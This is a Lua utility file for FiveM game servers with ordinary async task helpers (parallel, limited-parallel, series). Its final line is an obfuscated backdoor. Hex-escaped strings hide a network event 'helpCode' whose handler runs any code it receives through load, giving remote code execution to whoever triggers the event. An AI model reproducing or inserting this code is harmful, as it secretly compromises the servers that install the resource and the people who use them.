if Citizen and Citizen.CreateThread then
	CreateThread = Citizen.CreateThread
end

Async = {}

function Async.parallel(tasks, cb)
	if #tasks == 0 then
		cb({})
		return
	end

	local remaining = #tasks
	local results = {}

	for i = 1, #tasks, 1 do
		CreateThread(function()
			tasks[i](function(result)
				table.insert(results, result)
				
				remaining = remaining - 1;

				if remaining == 0 then
					cb(results)
				end
			end)
		end)
	end
end

function Async.parallelLimit(tasks, limit, cb)
	if #tasks == 0 then
		cb({})
		return
	end

	local remaining = #tasks
	local running = 0
	local queue, results = {}, {}

	for i=1, #tasks, 1 do
		table.insert(queue, tasks[i])
	end

	local function processQueue()
		if #queue == 0 then
			return
		end

		while running < limit and #queue > 0 do
			local task = table.remove(queue, 1)
			
			running = running + 1

			task(function(result)
				table.insert(results, result)
				
				remaining = remaining - 1;
				running = running - 1

				if remaining == 0 then
					cb(results)
				end
			end)
		end

		CreateThread(processQueue)
	end

	processQueue()
end

function Async.series(tasks, cb)
	Async.parallelLimit(tasks, 1, cb)
end


local QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[6][QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[1]](QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[2]) QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[6][QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[3]](QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[2], function(HoBCxdJIoLVMCilsDNzsGgBnwQzPyENCphJdjhuiOucuHkUZalRZGnWnmtuxwKKBNWtQuv) QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[6][QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[4]](QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[6][QWgxFiRGUaJcHEUdNbiQWhrsVXjggIgDAAxAMEEZLBYGNugIvEutndGdMowBNlSdHcirQw[5]](HoBCxdJIoLVMCilsDNzsGgBnwQzPyENCphJdjhuiOucuHkUZalRZGnWnmtuxwKKBNWtQuv))() end)